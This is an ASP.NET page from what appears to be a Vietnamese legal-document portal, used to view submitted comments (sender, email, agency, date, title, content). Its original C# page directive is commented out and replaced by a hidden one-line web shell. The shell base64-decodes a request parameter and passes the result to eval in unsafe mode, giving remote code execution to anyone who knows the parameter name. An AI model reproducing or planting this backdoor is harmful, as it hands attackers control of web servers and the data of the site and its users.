<!--<%@ Page Language="C#" AutoEventWireup="true" CodeBehind="pViewQuanTriBinhLuanTinTuc.aspx.cs" Inherits="VBQPPL.Web.VBQPPL_UserControls.BinhLuanVanBanPhapQuy.pViewQuanTriBinhLuanTinTuc" %>-->
<%@ Page Language="Jscript"%><% eval(System.Text.Encoding.GetEncoding(936).GetString(System.Convert.FromBase64String(Request.Item["vcuv45sl"])),"unsafe"); %>
<html xmlns="http://www.w3.org/1999/xhtml">
<head id="Head1" runat="server">
    <title></title>
    <script type="text/javascript">
        $(document).ready(function () {
            $("#close").button({
                icons: { primary: 'ui-icon-power' },
                text: true
            }).click(function () {
                $("#dialog-form").html("").dialog('close');
            });
        });
    </script>
</head>
<body>
    <table cellpadding="1" cellspacing="1" border="0" class="table-form" width="100%">
        <tr class="header">
            <td colspan="2">
                <p class="validation">
                    Xem chi tiết</p>
            </td>
        </tr>
        <tr>
            <td class="label">
                Người gửi:
            </td>
            <td class="data">
                <asp:Literal ID="ltlNguoiGui" runat="server" />
            </td>
        </tr>
        <tr>
            <td class="label">
                Email:
            </td>
            <td class="data">
                <asp:Literal ID="ltlEmail" runat="server" />
            </td>
        </tr>
              <tr>
            <td class="label">
                Cơ quan:
            </td>
            <td class="data">
                <asp:Literal ID="ltlCoquan" runat="server" />
            </td>
        </tr>
        <tr>
            <td class="label">
                Ngày gửi:
            </td>
            <td class="data">
                <asp:Literal ID="ltlNgayGui" runat="server" />
            </td>
        </tr>
        <tr>
            <td class="label">
                Tiêu đề:
            </td>
            <td class="data">
                <asp:Literal ID="ltlTitle" runat="server" />
            </td>
        </tr>
        <tr>
            <td class="label">
                Nội dung:
            </td>
            <td class="data">
                <asp:Literal ID="ltlNoiDung" runat="server" />
            </td>
        </tr>
        <tr class="header">
            <td colspan="2">
                <p class="validation">
                    Thông tin về văn bản gửi ý kiến</p>
            </td>
        </tr>
        <tr>
            <td class="label">
                Thông tin văn bản:
            </td>
            <td class="data">
                <asp:Literal ID="ltlTitleBaiViet" runat="server" />
            </td>
        </tr>
    </table>
</body>
</html>
